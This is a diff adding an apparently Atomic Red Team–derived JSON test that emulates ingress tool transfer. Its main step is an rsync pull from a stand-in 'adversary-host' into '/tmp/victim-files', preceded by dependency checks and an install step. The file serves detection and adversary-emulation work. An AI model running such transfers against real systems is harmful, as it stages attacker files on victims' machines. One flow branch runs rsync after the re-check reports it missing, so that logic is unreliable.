@@ -1,0 +1,105 @@
+{
+  "id": "3180f7d5-52c0-4493-9ea0-e3431a84773f",
+  "name": "rsync remote file copy (pull)",
+  "description": "Utilize rsync to perform a remote file copy (pull)\n",
+  "platforms": [
+    "linux",
+    "darwin"
+  ],
+  "steps": [
+    {
+      "id": "5f12dad8-0951-4770-92e8-20677938f685",
+      "type": "execute-command",
+      "data": {
+        "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9f1f7dd8-9afa-4742-a366-a5523a452015",
+      "name": "Check dependency 1/1",
+      "description": "rsync must be installed on the machine \n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e74c7fda-8592-488c-917b-22c1ecff9af7",
+      "name": "Resolve dependency 1/1",
+      "description": "rsync must be installed on the machine \n",
+      "type": "execute-command",
+      "data": {
+        "command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b7ab9dc7-cc41-4dda-bc35-bd20d76e3fb8",
+      "name": "Re-check dependency 1/1",
+      "description": "rsync must be installed on the machine \n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "9f1f7dd8-9afa-4742-a366-a5523a452015",
+      "p": "on-success",
+      "o": "5f12dad8-0951-4770-92e8-20677938f685"
+    },
+    {
+      "s": "9f1f7dd8-9afa-4742-a366-a5523a452015",
+      "p": "on-failure",
+      "o": "e74c7fda-8592-488c-917b-22c1ecff9af7"
+    },
+    {
+      "s": "e74c7fda-8592-488c-917b-22c1ecff9af7",
+      "p": "on-success",
+      "o": "b7ab9dc7-cc41-4dda-bc35-bd20d76e3fb8"
+    },
+    {
+      "s": "b7ab9dc7-cc41-4dda-bc35-bd20d76e3fb8",
+      "p": "on-failure",
+      "o": "5f12dad8-0951-4770-92e8-20677938f685"
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_host",
+      "type": "string",
+      "description": "Remote host to copy from",
+      "value": "adversary-host"
+    },
+    {
+      "name": "local_path",
+      "type": "path",
+      "description": "Local path to receive rsync",
+      "value": "/tmp/victim-files"
+    },
+    {
+      "name": "username",
+      "type": "string",
+      "description": "User account to authenticate on remote host",
+      "value": "adversary"
+    },
+    {
+      "name": "remote_path",
+      "type": "path",
+      "description": "Path of folder to copy",
+      "value": "/tmp/adversary-rsync/"
+    }
+  ]
+}
